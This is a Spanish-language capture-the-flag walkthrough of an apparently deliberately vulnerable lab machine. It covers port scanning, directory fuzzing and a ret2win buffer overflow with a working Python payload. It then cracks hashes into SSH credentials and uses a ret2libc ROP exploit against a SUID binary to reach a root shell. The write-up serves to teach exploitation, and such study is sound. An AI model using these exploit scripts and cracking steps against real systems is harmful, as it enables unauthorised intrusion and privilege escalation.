## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

Puerto 39817 : Unknown 

En el puerto 80 solo hay un mensaje que dice:

```python
Esta web no se puede hackear
```

Y en el puerto 39817 vemos un mensaje en texto que no interesa.

Pruebo haciendo fuzzing de directorios al puerto 80:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://172.17.0.2/
```

Encuentro /app1 que al abrirlo el el navegador se nos descarga un binario llamado app1.

Lo analizo:

```bash
file app1
# Info:
ELF 64-bit LSB executable, x84-64
```

```bash
strings -d app1
# Info:
<secret_function>
```

Hay muchas cosas, pero solo interesa esa. Examinándola:

```bash
objdump -d app1 | grep -A10 "<secret_function>"
00000000004011b6 <secret_function>:
  4011b6: push   %rbp
  4011b7: mov    %rsp,%rbp
  4011ba: lea    0xe47(%rip),%rax
  4011c1: mov    %rax,%rdi
  4011c4: call   401030 <puts@plt>
  4011c9: nop
  4011ca: pop    %rbp
  4011cb: ret
```

Esta función llama puts() para imprimir algo, checando strings se puede ver que es:

```bash
strings app1 | grep "P1"
P1 --> 02e5e6ea15b5d3088af6edf49269a7221eb88dc32747420dc2e482110f649deb
```

Es un ret2win escenario. El archivo binario contiene una función llamada "win" a la que no deberíamos acceder mediante la ejecución normal. Aprovechando el desbordamiento del búfer, podemos redirigir la ejecución a esta función para filtrar el hash.

Lo ejecuto:

```bash
(gdb) r
# Info:
Escuchando en 0.0.0.0:17562!
```

Veo que espera conexión desde el host. Utilizo telnet para recibirla:

```bash
telnet 127.0.0.1 17562
# Info:
Escribe algo: 
```

Al insertar algún dato regresa un “gracias”.

Pruebo el desbordamiento de bufer para encontrar un posible vector de ataque:

```bash
(gdb) cyclic 400
aaaaaaaabaaaaaaacaaaaaaadaaaa...
(gdb) run
# Info:
Program received signal SIGSEGV, Segmentation fault.
RSP  0x7fffffffdc78 ◂— 'raaaaaaasaaaa...'
```

Confirmando así la vulnerabilidad. Después reviso las medidas de seguridad que tiene el binario:

```bash
(gdb) checksec
# Info:
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

NX está habilitado, lo que significa que no podemos inyectar ni ejecutar shellcode en la pila. Sin embargo, dado que PIE está deshabilitado y no hay un canario de pila, podemos usar técnicas de Programación Orientada a Retorno (ROP).

Para encontrar la vulnerabilidad hay que examinar las funciones del binario, en este caso pondré la interesante:

```bash
(gdb) disass testing_function
   0x00000000004013e1 <+533>: lea    rcx,[rbp-0x130]    # Buffer address
   0x00000000004013eb <+543>: mov    edx,0x400          # Read up to 1024 bytes
   0x00000000004013f5 <+553>: call   0x401080 <read@plt>
```

El búfer tiene un tamaño de 0x130 (304) bytes, pero la función read() acepta hasta 0x400 (1024) bytes. Se trata de un desbordamiento de búfer clásico basado en la pila.

Ahora toca encontrar el offset:

```bash
(gdb) cyclic 400
aaaaaaaabaaaaaaacaaaaaaadaaaa...

(gdb) run
# Lo mando por netcat al puerto 17562

Program received signal SIGSEGV, Segmentation fault.
RSP  0x7fffffffdc78 ◂— 'raaaaaaasaaaa...'

(gdb) cyclic -l raaaaaaa
Found at offset 312
```

Para controlar la dirección necesitamos 312 bytes de margen.

En este caso, tenemos un simple ret2win: solo necesitamos saltar a secret_function. No se requieren cadenas de gadgets complejas.

Ahora ya sabemos que cuando enviemos 312 bytes al socket, los siguientes 8 bytes son los que van a sobrescribir el EIP. Y lo que vamos a meter en el EIP es la dirección de la función secret_function, así que volvemos a hacer  `gdb app1`, `info functions` y copiamos la dirección que aparezca a la izquierda de secret_function.

Ya teniendo todo:

- Offset
- Dirección de retorno dde la función secret (`0x00000000004011b6` )

Creamos el payload con Python:

```python
#!/usr/bin/python3

from pwn import p64
import socket

payload = b'A' * 312 + p64(0x00000000004011b6)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(("127.0.0.1", 17562))

sock.recv(1024)

sock.send(payload + b'\r\n')

sock.close()
```

Lo conectamos al socket del binario. Recibimos 1024 bytes, correspondientes al texto "Escribe algo:" que nos envía el binario. Enviamos el payload y cerramos el socket.

Nos da un hash SHA256.

```bash
echo "02e5e6ea15b5d3088af6edf49269a7221eb88dc32747420dc2e482110f649deb" > hash.txt
hashcat -m 1400 hash.txt /usr/share/seclists/Passwords/rockyou.txt

02e5e6ea15b5d3088af6edf49269a7221eb88dc32747420dc2e482110f649deb:tiggerjake
```

Parece una contraseña. Como no tengo ningún usuario posible en SSH pruebo por el puerto de servicio desconocido:

```bash
nc 172.17.0.2 39817
Contraseña: tiggerjake
pepe:8f47d09d47172c5d9a5714ba332b33301301014d7926b7a84cb577a8b465f680@localhost

```

Pepe parece usuario y un hash, que al crackearlo revela: plasticfloor17

Son las credenciales de ssh.

## Escalada

Listando SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
# Info:
/home/pepe/app3
```

Ese binario es el vulnerable (ya que existe también app2).

Lo paso al host para examinar sus funciones:

```bash
Strings app3
```

Interesa: gets, vuln y asmf

Gets() es una función muy insegura que lee sin sanitizar, garantizando asi el desbordamiento de bufer.

Toca examinar la función asmf:

```bash
(gdb) disas asmf
Dump of assembler code for function asmf:
   0x0000000000401166 <+0>: push   rbp
   0x0000000000401167 <+1>: mov    rbp,rsp
   0x000000000040116a <+4>: pop    rdi
   0x000000000040116b <+5>: nop
   0x000000000040116c <+6>: pop    rbp
   0x000000000040116d <+7>: ret
```

Esta función es en realidad un dispositivo ROP diseñado específicamente: pop rdi; pop rbp; ret. Esto nos permite controlar el registro RDI, que se utiliza para pasar el primer argumento a las funciones en x86-64.

Igual, empiezo determinando el offset:

```
(gdb) cyclic 200
(gdb) run
# Mando el string

RSP  0x7fffffffdc48 ◂— 'raaaaaaasaaaa...'

(gdb) cyclic -l raaaaaaa
Found at offset 136
```

Ahora reviso el ASLR Status:

```bash
pepe@aa29efee64c1:~$ cat /proc/sys/kernel/randomize_va_space
0
```

Dado que app3 no tiene una función de "win" tan práctica como app1, y system() no está en su PLT, necesitamos llamar a system() directamente desde libc. Esta técnica se llama ret2libc.

El objetivo es ejecutar system("/bin/sh"). En x86-64, el primer argumento de la función se pasa a través del registro RDI. Nuestra cadena ROP necesita:

Cargar la dirección de "/bin/sh" en RDI

Llamar a system()

La función asmf proporciona convenientemente un gadget pop rdi, lo que nos permite controlar RDI.

Conociendo esto ocupo sacar info de libc:

```bash
pepe@aa29efee64c1:~$ ldd /home/pepe/app3
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7ddb000)

pepe@aa29efee64c1:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"
1023: 000000000004c490    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5

pepe@aa29efee64c1:~$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
196031 /bin/sh
```

Teniendo estas 3 direcciones podemos crear el payload con Python:

```python
from pwn import *

shell = ssh('pepe', '172.17.0.2', password='plasticfloor17')
p = shell.process('/home/pepe/app3')

libc_base = 0x7ffff7ddb000
system = libc_base + 0x4c490
binsh = libc_base + 0x196031

pop_rdi_rbp = p64(0x40116a)  # pop rdi; pop rbp; ret
payload = b'A' * 136 + pop_rdi_rbp + p64(binsh) + p64(0) + p64(system)

p.sendline(payload)
p.interactive()

```

Esto nos regresara una shell como usuario root.

Listo.
